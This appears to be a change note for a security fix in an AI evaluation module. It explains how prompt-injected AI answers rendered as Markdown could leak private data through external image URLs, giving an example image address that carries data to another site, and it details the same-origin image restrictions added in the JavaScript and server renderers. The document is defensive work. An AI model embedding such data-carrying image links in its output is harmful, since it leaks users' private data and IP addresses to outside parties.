## Summary

AI answers and imported traces are rendered as Markdown in trace review and on the optimizer pages. An image in that Markdown, such as `![](https://example.com/?d=...)`, used to make the reviewer's browser request that address. A prompt-injected answer could put private data into the URL and also reveal the visit time and IP address to the other site. Images now load only when they come from the same site. Any other image is shown as a plain link with its alt text and address, so the reviewer can still open it on purpose. `data:` images stay refused. This shipped inside a larger bundled fix commit for a code review of 1.1.0-alpha10, and the release notes list it under Security.

## Impact

Affects site owners.

- **Security:** Markdown rendering in trace review, optimizer pages and any page using `ai_eval/markdown` no longer lets external or `//host` images load automatically, which closes a data exfiltration path via image URLs.

## Technical details

There are two renderers, and both were changed. In `js/markdown-render.js` the `IMG_SCHEMES` allowlist is replaced by `isLocalImage()`. It strips whitespace and control characters and converts backslashes to slashes. It rejects an empty value or one starting with `//`, then resolves the value against `window.location.href` and requires an http(s) URL with the page's own origin. During sanitizing, any `IMG` that fails the check is replaced by an `<a>` whose text is `alt (src)`. The `href` is set only if the source passes the existing `HREF_SCHEMES` check.

On the server, `TraceReviewFragment::safeMarkup()` now passes the CommonMark output through a new private `restrictImages()` before `Xss::filter()`. It parses the HTML and keeps an `img` only if its source is relative, or absolute with the same scheme, host and port as the current request. A source starting with `//` is never kept. Other images become a link labelled with the alt text and source. The link gets an `href` only for http(s) or `//` sources. Without CommonMark the text is still escaped, so no image appears.

The same commit adds `league/commonmark` (`^2.4`) to the module's `composer.json` `require`. The `safeMarkup()` docblock still describes CommonMark as not a hard dependency.
